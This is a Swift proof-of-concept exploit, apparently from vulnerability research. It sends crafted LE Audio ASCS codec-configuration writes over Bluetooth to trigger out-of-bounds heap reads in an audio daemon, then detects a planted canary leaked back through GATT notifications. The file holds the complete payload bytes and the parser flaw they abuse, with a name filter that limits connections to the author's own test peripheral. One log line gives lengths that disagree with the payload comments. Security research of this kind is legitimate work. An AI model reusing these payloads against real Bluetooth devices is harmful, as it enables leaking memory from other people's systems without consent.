// attack.swift — CBCentralManager that writes the crafted ASCS codec-config
// payload to OUR OWN victim_peripheral (LEAUDIO-POC-VICTIM) and reads the
// echoed OOB bytes back from characteristic notifications.
//
// Payload construction mirrors decomp/re_bluetoothaudiod.c exactly:
//   - write to ASE Control Point (0x2B86), opcode 1 dispatches to
//     codecConfigRequest_ (:35586-35592, @10003344c)
//   - header: numASE(local_91) + ASE_ID(local_94) + latency(local_95) +
//     PHY(local_96) + codecID readUint40_ (5 B LE) + declared config length
//     local_97 (:35838) + config bytes
//   - parser TLV wire order per decompile: [len][type][value...]
//   - the DECLARED length (local_97) drives the parse loop bound (:35880) and
//     the type-3/4 copy sizes (bVar3, :35863/:35872) — never validated against
//     the bytes the write actually carries (:31250-31252).
//
// SAFETY: connects ONLY to the peripheral whose advertised local name is
// exactly "LEAUDIO-POC-VICTIM" (our own virtual peripheral on this Mac).
// Never scans-and-attacks third parties.
//
// Build: swiftc -O -o attack attack.swift

import Foundation
import CoreBluetooth

let kServiceUUID      = CBUUID(string: "184B")
let kSinkASEUUID      = CBUUID(string: "2B84")
let kSourceASEUUID    = CBUUID(string: "2B85")
let kControlPointUUID = CBUUID(string: "2B86")
let kVictimName       = "LEAUDIO-POC-VICTIM"
let kMagic: [UInt8]   = [0xCA, 0xFE, 0xBA, 0xBE]   // canary magic planted by victim

func ts(_ s: String) { print("[attack \(Date().formatted(date: .omitted, time: .standard))] \(s)") }
func hex(_ d: Data) -> String { d.map { String(format: "%02x", $0) }.joined(separator: " ") }

// MARK: - Crafted payloads

// Payload 1 — complete write, OOB via trailing type-3 copy:
//   64 config bytes are actually carried (declared == actual == 0x40 == the
//   config allocation's exact malloc size), and the final TLV header sits at
//   config idx 62 with len=4 type=3, so the memcpy source (idx+2 = 64) starts
//   EXACTLY at the first byte of the adjacent canary heap object → the whole
//   4-byte copy (CA FE BA BE) is read cross-boundary.
func fullLengthPayload() -> Data {
    var p: [UInt8] = [0x01]              // opcode 1: Codec Configuration
    p += [0x01]                          // numASE (local_91)
    p += [0x01]                          // ASE_ID
    p += [0x02]                          // target latency
    p += [0x02]                          // preferred PHY
    p += [0x06, 0x00, 0x00, 0x00, 0x00]  // codec ID (5 B, LE) — 6 = LC3
    p += [0x40]                          // local_97: declared = 64 == actual == alloc size
    // config TLVs (wire order [len][type][value]); 20 × 3-byte type-1 TLVs → idx 60:
    for i in 0..<20 { p += [0x01, 0x01, UInt8(0x08 + i)] }
    p += [0x00, 0x2A]                    // idx 60: unknown type → advance 2
    p += [0x04, 0x03]                    // idx 62: len=4 type=3 — copy src=idx+2=64 → canary[0..4)
    return Data(p)
}

// Payload 2 — truncated write (xpc_sweep_findings.md finding 2, primary shape):
//   local_97 declares 240 bytes but the write carries only 3 →
//   readNumBytes_toData_ appends NOTHING (:31250-31252), the NSMutableData
//   stays EMPTY, and the parse loop still walks to 240 reading raw heap.
func truncatedPayload() -> Data {
    var p: [UInt8] = [0x01, 0x01, 0x01, 0x02, 0x02, 0x06, 0x00, 0x00, 0x00, 0x00]
    p += [0xF0]                          // local_97: declared = 240 >> actual = 3
    p += [0x04, 0x03, 0x11]              // 3 actual config bytes
    return Data(p)
}

// MARK: - Echo analysis

var magicHits: [(String, Int)] = []

func analyze(_ label: String, _ data: Data) {
    ts("\(label): \(hex(data)) (\(data.count) B)")
    var display = ""
    for (i, byte) in data.enumerated() {
        display += String(format: "%02x", byte)
        if (i + 1) % 16 == 0 { display += "\n          " } else { display += " " }
    }
    ts("dump:\n          \(display)")
    // Search for the canary magic anywhere in the echoed bytes.
    let b = [UInt8](data)
    var i = 0
    while i + 4 <= b.count {
        if Array(b[i..<i+4]) == kMagic {
            magicHits.append((label, i))
            ts(">>> CANARY MAGIC CA FE BA BE found at echo offset \(i) — OOB read echoed back over GATT <<<")
        }
        i += 1
    }
    // Decode the victim's instrumented TLV trailer: [len][type][region][copyLen][copy...]
    if b.count >= 14, b[0] == 0x01 {
        let n = Int(b[13])
        var o = 14
        var oobCount = 0
        for t in 0..<n {
            guard o + 4 <= b.count else { break }
            let len = b[o], type = b[o+1], region = b[o+2], cl = Int(b[o+3])
            let copy = o + 4 + cl <= b.count ? Array(b[(o+4)..<(o+4+cl)]) : []
            let tag = region == 0 ? "in-bounds" : region == 1 ? "SLACK(oob)" : region == 2 ? "CANARY(oob)" : "BEYOND(clamped)"
            if region >= 1 { oobCount += 1 }
            ts("  echo tlv[\(t)] len=0x\(String(len, radix: 16)) type=0x\(String(type, radix: 16)) region=\(tag)\(copy.isEmpty ? "" : " copy=\(hex(Data(copy)))")")
            o += 4 + cl
        }
        ts("echo TLVs parsed: \(n), OOB-sourced: \(oobCount)")
    }
}

// MARK: - Central

final class Attack: NSObject, CBCentralManagerDelegate, CBPeripheralDelegate {
    var central: CBCentralManager!
    var target: CBPeripheral!
    var sink: CBCharacteristic!
    var source: CBCharacteristic!
    var cp: CBCharacteristic!
    var wrote1 = false, wrote2 = false

    override init() {
        super.init()
        central = CBCentralManager(delegate: self, queue: nil)
    }

    func centralManagerDidUpdateState(_ central: CBCentralManager) {
        ts("CM state: \(central.state.rawValue)")
        if central.state == .poweredOn {
            ts("scanning for 0x184B (filter: local name == \(kVictimName) — our own peripheral only)")
            central.scanForPeripherals(withServices: [kServiceUUID],
                                       options: [CBCentralManagerScanOptionAllowDuplicatesKey: false])
        } else if central.state == .unauthorized || central.state == .unsupported {
            ts("FATAL: CoreBluetooth \(central.state == .unauthorized ? "unauthorized (TCC)" : "unsupported") — loopback cannot run")
            exit(2)
        }
    }

    func centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral,
                        advertisementData: [String: Any], rssi RSSI: NSNumber) {
        let name = advertisementData[CBAdvertisementDataLocalNameKey] as? String
            ?? peripheral.name ?? ""
        let svcs = (advertisementData[CBAdvertisementDataServiceUUIDsKey] as? [CBUUID])?.map { $0.description } ?? []
        // Passive receive-only diagnostics for every advertiser; connection is
        // strictly name-filtered to our own victim below (safety scope).
        ts("scan: name=\"\(name)\" rssi=\(RSSI) svcs=\(svcs) connectable=\(advertisementData["kCBAdvDataIsConnectable"] ?? "?")")
        guard name == kVictimName else { return }
        ts("discovered victim \"\(name)\" rssi=\(RSSI) — connecting")
        central.stopScan()
        target = peripheral
        target.delegate = self
        central.connect(target, options: nil)
    }

    func centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {
        ts("connected to \(peripheral.name ?? peripheral.identifier.uuidString)")
        peripheral.discoverServices([kServiceUUID])
    }

    func peripheral(_ peripheral: CBPeripheral, didDiscoverServices error: Error?) {
        ts("services: \(peripheral.services?.map { $0.uuid.description } ?? [])")
        peripheral.discoverCharacteristics([kSinkASEUUID, kSourceASEUUID, kControlPointUUID],
                                           for: peripheral.services!.first!)
    }

    func peripheral(_ peripheral: CBPeripheral, didDiscoverCharacteristicsFor service: CBService, error: Error?) {
        for c in service.characteristics ?? [] {
            ts("characteristic \(c.uuid) props=\(c.properties.rawValue)")
            if c.uuid == kControlPointUUID { cp = c }
            if c.uuid == kSinkASEUUID { sink = c; peripheral.setNotifyValue(true, for: c) }
            if c.uuid == kSourceASEUUID { source = c; peripheral.setNotifyValue(true, for: c) }
            if c.uuid == kControlPointUUID { peripheral.setNotifyValue(true, for: c) }
        }
        // Give subscriptions a beat to settle, then fire payload 1.
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            ts("=== WRITE 1 (complete write, trailing type-3 overrun: declared=16, copy src=16..19 OOB) ===")
            ts("payload: \(hex(fullLengthPayload()))")
            self.target.writeValue(fullLengthPayload(), for: self.cp, type: .withResponse)
            self.wrote1 = true
        }
    }

    func peripheral(_ peripheral: CBPeripheral, didUpdateValueFor characteristic: CBCharacteristic, error: Error?) {
        guard let v = characteristic.value else { return }
        analyze("notify \(characteristic.uuid)", v)
    }

    func peripheral(_ peripheral: CBPeripheral, didWriteValueFor characteristic: CBCharacteristic, error: Error?) {
        ts("write ack (\(error.map { "error: \($0)" } ?? "ok"))")
        if wrote1 && !wrote2 {
            wrote2 = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                ts("=== WRITE 2 (truncated write: declared=240, actual=3 → empty NSMutableData, parser walks raw heap) ===")
                ts("payload: \(hex(truncatedPayload()))")
                peripheral.writeValue(truncatedPayload(), for: self.cp, type: .withResponse)
            }
        }
    }

    func centralManager(_ central: CBCentralManager, didFailToConnect peripheral: CBPeripheral, error: Error?) {
        ts("failed to connect: \(error.map { String(describing: $0) } ?? "unknown")")
    }
}

// --print-payloads: emit the crafted payloads as hex lines (canonical source
// for the victim's --parse direct-feed selftest, so payload bytes exist in
// exactly one place).
if CommandLine.arguments.contains("--print-payloads") {
    print(fullLengthPayload().map { String(format: "%02x", $0) }.joined())
    print(truncatedPayload().map { String(format: "%02x", $0) }.joined())
    exit(0)
}

// Final verdict (BLE mode only).
DispatchQueue.main.asyncAfter(deadline: .now() + 50.0) {
    ts("=== VERDICT ===")
    if magicHits.isEmpty {
        ts("canary magic NOT observed in echoed bytes — see static_evidence.md caveats")
    } else {
        ts("canary magic CA FE BA BE observed at \(magicHits.count) echo offset(s): \(magicHits.map { "\($0.0)@\($0.1)" }.joined(separator: ", "))")
        ts("SELF-TEST PASSED: crafted write → OOB read → echo-back leak over GATT")
    }
    exit(magicHits.isEmpty ? 1 : 0)
}

ts("LE Audio ASCS attack — targets ONLY \"\(kVictimName)\" on this Mac (safety filter enforced in didDiscover)")
let attack = Attack()
dispatchMain()
